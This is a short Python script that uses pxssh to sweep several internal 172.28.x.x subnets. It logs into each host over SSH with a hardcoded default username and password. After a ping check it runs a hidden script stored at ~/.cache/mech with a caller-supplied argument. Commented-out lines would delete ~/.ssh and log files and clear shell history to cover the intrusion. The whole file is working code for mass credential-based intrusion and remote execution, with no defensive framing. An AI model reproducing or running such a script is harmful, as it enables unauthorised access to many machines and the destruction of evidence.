import pexpect
from pexpect import pxssh
import sys,os,shutil,socket

def xyz(ip,argv1):
	s = pxssh.pxssh()
	host1 = 'iiserb'
	s.force_password = True
	try :
		s.login(ip,host1,host1,login_timeout=1)
		s.sendline(' ping -w1 google.com &> /dev/null; echo $?')
		s.prompt()
		x = s.before
		if x.decode("utf-8")[-3]== '1':
			s.sendline(' /usr/bin/python3 ~/.cache/mech '+argv1)
			#s.sendline(argv1+' &> /dev/null')
			#s.sendline(' rm -r  ~/.ssh/  ~/wget-log ~/.bash_history &> /dev/null')
			#s.sendline(' history -c')
			print("logged in!!!")
		s.logout()
	except Exception as e :
		print ("Error!!!")






ip1 = ['172.28.123.'+str(i) for i in range(1,120)]
ip2 = ['172.28.154.'+str(i) for i in range(1,60)]
ip3 = ['172.28.155.'+str(i) for i in range(46)]
ip4 = ['172.28.122.'+str(i) for i in range(81)]
ips=ip2+ip3+ip4
for ip in ips:
	print(ip)
	xyz(ip,sys.argv[1])

